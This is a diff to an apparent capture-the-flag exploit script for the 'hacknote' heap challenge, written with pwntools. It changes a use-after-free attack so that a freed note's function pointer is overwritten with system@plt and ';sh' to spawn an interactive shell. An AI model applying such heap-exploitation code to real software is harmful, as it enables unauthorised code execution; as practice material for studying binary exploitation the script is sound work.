@@ -11,7 +11,7 @@ def note_add(p, size, content):
     p.recvuntil('Note size :')
     p.sendline(str(size))
     p.recvuntil('Content :')
-    p.sendline(content)
+    p.send(content)
 
 def note_delete(p, index):
     p.recvuntil('Your choice :')
@@ -28,19 +28,23 @@ def note_print(p, index):
 p = process('./hacknote')
 elf = ELF('./hacknote')
 gdb_command =   """
-                b *0x80486ca
-                b *0x8048893
-                b *0x80488a9
-                b *0x804875c
+                #b *0x80486ca
+                #b *0x8048893
+                #b *0x80488a9
+                #b *0x804875c
+                #b *0x804896C
                 """
-magic_addr = 0x08048986
-gdb.attach(p, gdb_command)
 
-note_add(p, 100, "abcdefghijklmn")
-note_add(p, 100, "abcdefghijklmn")
+system_addr = elf.plt['system'] + 0x6
+# gdb.attach(p, gdb_command)
+
+
+note_add(p, 100, "/bin/sh\x00")
+note_add(p, 100, "/bin/sh\x00")
 note_delete(p, 0)
 note_delete(p, 1)
-note_add(p, 8, p32(magic_addr))
+note_add(p, 8, p32(system_addr) + ";sh\x00")
 note_print(p, 0)
+
 
 p.interactive()
